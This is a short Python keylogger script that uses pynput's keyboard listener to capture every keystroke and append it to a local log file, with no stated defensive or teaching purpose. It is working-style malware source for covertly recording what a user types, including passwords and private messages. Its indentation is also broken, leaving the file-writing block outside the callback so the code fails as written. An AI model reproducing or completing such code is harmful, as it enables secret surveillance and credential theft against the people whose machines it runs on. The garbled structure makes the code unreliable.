from pynput.keyboard import Listener
def log_keystroke(key):
    key = str(key).replace("'", "")#remove quotes
    if key == "Key.space":
        key = " "#convert "key.space" to actual space
    elif key == "Key.enter":
        key = "\n"#convert enter key to newline
with open("log1.txt", "a") as f:
        f.write(key)#write the key to the file
with Listener(on_press=log_keystroke) as listener:
    listener.join()#start the listener
